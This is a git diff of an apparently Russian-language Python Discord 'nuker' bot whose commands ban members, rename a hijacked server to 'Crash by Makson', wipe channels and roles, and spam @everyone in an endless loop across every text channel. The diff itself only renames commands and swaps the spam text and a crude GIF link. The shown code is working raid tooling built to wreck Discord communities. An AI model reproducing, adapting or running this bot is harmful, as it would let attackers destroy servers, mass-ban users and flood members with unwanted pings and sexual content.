@@ -64,7 +64,7 @@ async def hlp(ctx):
     print(f"{Fore.WHITE}> {Fore.RED}Было{Fore.WHITE}: {ban} {Fore.RED} человек, в вайтлисте{Fore.WHITE}: {wta}, а забанил{Fore.WHITE}: {bany} {Fore.RED} человек {Fore.WHITE}.")
     
     await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
-    await ctx.guild.edit(name="Концерт фейса")
+    await ctx.guild.edit(name="Crash by Makson")
     print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
     
     print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
@@ -157,11 +157,11 @@ async def start(ctx):
   print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")
 
 @client.command()
-async def ml(ctx):
+async def lucifer(ctx):
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
     while True:
         for channel in ctx.guild.text_channels:
-          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
+          await channel.send("Люцифер ТОП @everyone")
 
 @client.command()
 async def gamehelp(ctx):
@@ -171,10 +171,10 @@ async def gamehelp(ctx):
 
 
 @client.command()
-async def gif(ctx):
+async def ass(ctx):
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Рассылаем гифки")
     for channel in ctx.guild.text_channels:
-     await channel.send("https://gfycat.com/flakyacrobatickusimanse")
+     await channel.send("https://tenor.com/view/ass-jeans-grope-grab-booty-gif-15058415")
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Кинул гифку в {channel}")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Разослал гифки")
 
